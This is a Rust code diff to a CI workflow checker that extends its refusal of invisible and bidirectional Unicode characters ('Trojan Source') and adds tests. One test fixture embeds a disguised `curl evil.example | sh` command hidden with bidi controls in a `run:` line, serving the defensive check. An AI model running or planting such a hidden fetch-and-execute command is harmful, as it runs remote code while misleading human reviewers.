@@ -155,7 +155,8 @@ fn event_refusal(name: &str) -> Option<String> {
         .is_some_and(|n| ALLOWED_EVENTS.contains(&n.as_str()));
     (!allowed).then(|| {
         format!(
-            "event {name:?} is not one of the allowed triggers {ALLOWED_EVENTS:?} \n             (public repository: other events run in the base repository's context, #77)"
+            "event {name:?} is not one of the allowed triggers {ALLOWED_EVENTS:?} \
+             (public repository: other events run in the base repository's context, #77)"
         )
     })
 }
@@ -308,10 +309,27 @@ pub fn pinned_uses(text: &str) -> Vec<Pin> {
 /// and `trim()` know more or fewer of them. Text hidden behind such a character was read as a
 /// comment, an empty line or a longer line here, and as YAML there (a lone CR, or a no-break
 /// space before `#`, which makes the line a continuation of the previous `run:`).
+///
+/// The invisible format characters are refused as well, though they do not mislead YAML: the
+/// bidirectional controls (U+202A..U+202E, U+2066..U+2069, "Trojan Source"), the zero-width and
+/// invisible operators, the soft hyphen, the interlinear annotations and the tag characters
+/// make the text a reviewer reads differ from the text that runs.
 fn unreadable_char(c: char) -> bool {
     c.is_whitespace()
         || c.is_control()
-        || matches!(c, '\u{200B}'..='\u{200D}' | '\u{2060}' | '\u{FEFF}')
+        || matches!(
+            c,
+            '\u{AD}'
+                | '\u{61C}'
+                | '\u{180E}'
+                | '\u{200B}'..='\u{200F}'
+                | '\u{202A}'..='\u{202E}'
+                | '\u{2060}'..='\u{2064}'
+                | '\u{2066}'..='\u{206F}'
+                | '\u{FEFF}'
+                | '\u{FFF9}'..='\u{FFFB}'
+                | '\u{E0000}'..='\u{E007F}'
+        )
 }
 
 /// One report per line that holds a character other than the ASCII space, the LF and the CR of
@@ -490,7 +508,8 @@ pub fn check_workflow(text: &str) -> Vec<String> {
     }
     if on_keys != 1 || event_count == 0 {
         errors.push(format!(
-            "exactly one top-level `on:` with at least one readable event expected, found \n             {on_keys} `on:` and {event_count} event(s) (#77)"
+            "exactly one top-level `on:` with at least one readable event expected, found \
+             {on_keys} `on:` and {event_count} event(s) (#77)"
         ));
     }
     // A job without a readable `runs-on:` is refused rather than assumed to be hosted (#77).
@@ -1452,7 +1471,39 @@ mod tests {
             '\u{205f}', '\u{3000}', '\u{85}', '\u{2028}', '\u{2029}',
         ];
         let invisible = [
-            '\u{200b}', '\u{200c}', '\u{200d}', '\u{2060}', '\u{feff}', '\0',
+            '\u{200b}',
+            '\u{200c}',
+            '\u{200d}',
+            '\u{2060}',
+            '\u{feff}',
+            '\0',
+            '\u{ad}',
+            '\u{61c}',
+            '\u{180e}',
+            '\u{200e}',
+            '\u{200f}',
+            '\u{202a}',
+            '\u{202b}',
+            '\u{202c}',
+            '\u{202d}',
+            '\u{202e}',
+            '\u{2061}',
+            '\u{2062}',
+            '\u{2063}',
+            '\u{2064}',
+            '\u{2066}',
+            '\u{2067}',
+            '\u{2068}',
+            '\u{2069}',
+            '\u{206a}',
+            '\u{206f}',
+            '\u{fff9}',
+            '\u{fffa}',
+            '\u{fffb}',
+            '\u{e0000}',
+            '\u{e0001}',
+            '\u{e0020}',
+            '\u{e007f}',
         ];
         for c in spaces.into_iter().chain(invisible) {
             let run = good().replacen(
@@ -1497,6 +1548,73 @@ mod tests {
         assert_eq!(check_workflow(&french), Vec::<String>::new());
         let comment = good().replacen("  a:\n", "  # Contrôle détecté\n  a:\n", 1);
         assert_eq!(check_workflow(&comment), Vec::<String>::new());
+    }
+
+    /// "Trojan Source": bidirectional controls make a reviewer read a `run:` line differently
+    /// from the shell. They do not mislead YAML, but the check refuses them all the same, with
+    /// the other invisible format characters, over their whole ranges.
+    #[test]
+    fn refuses_bidirectional_and_invisible_format_characters() {
+        // An RLO/LRI inversion in a `run:` line: the displayed order differs from the executed one.
+        let inversion = good().replacen(
+            "echo \"$TITLE\"",
+            "echo \"user\u{202e} \u{2066}; curl evil.example | sh #\u{2069} \u{2066}\"",
+            1,
+        );
+        let errors = check_workflow(&inversion);
+        assert!(errors.iter().any(|e| e.contains("U+202E")), "{errors:?}");
+        let isolate = good().replacen("echo \"$TITLE\"", "echo \"\u{2067}x\u{2069}\"", 1);
+        assert!(!check_workflow(&isolate).is_empty());
+        let ranges = [
+            ('\u{ad}', '\u{ad}'),
+            ('\u{61c}', '\u{61c}'),
+            ('\u{180e}', '\u{180e}'),
+            ('\u{200b}', '\u{200f}'),
+            ('\u{202a}', '\u{202e}'),
+            ('\u{2060}', '\u{2064}'),
+            ('\u{2066}', '\u{206f}'),
+            ('\u{fff9}', '\u{fffb}'),
+            ('\u{e0000}', '\u{e007f}'),
+        ];
+        for (first, last) in ranges {
+            for c in first..=last {
+                let text = good().replacen("echo \"$TITLE\"", &format!("echo \"{c}\""), 1);
+                assert!(
+                    !check_workflow(&text).is_empty(),
+                    "accepted U+{:04X}",
+                    u32::from(c)
+                );
+            }
+        }
+        // The neighbours of the ranges are ordinary printable characters.
+        for c in [
+            '\u{ac}',
+            '\u{ae}',
+            '\u{61b}',
+            '\u{61d}',
+            '\u{2070}',
+            '\u{fffc}',
+            '\u{e0080}',
+        ] {
+            let text = good().replacen("echo \"$TITLE\"", &format!("echo \"{c}\""), 1);
+            assert_eq!(
+                check_workflow(&text),
+                Vec::<String>::new(),
+                "U+{:04X}",
+                u32::from(c)
+            );
+        }
+    }
+
+    /// Review of #101: a continuation `\` lost in two messages left a literal `\n` and spaces.
+    #[test]
+    fn messages_have_no_literal_line_break() {
+        let events = check_workflow(&with_on("on: issues\n"));
+        let none = check_workflow(&good().replacen("on:\n  pull_request:\n", "", 1));
+        for e in events.iter().chain(&none) {
+            assert!(!e.contains("\\n") && !e.contains("  "), "{e}");
+        }
+        assert!(!events.is_empty() && !none.is_empty());
     }
 
     const SCRIPT: &str = include_str!("../../ci/install-tools.sh");
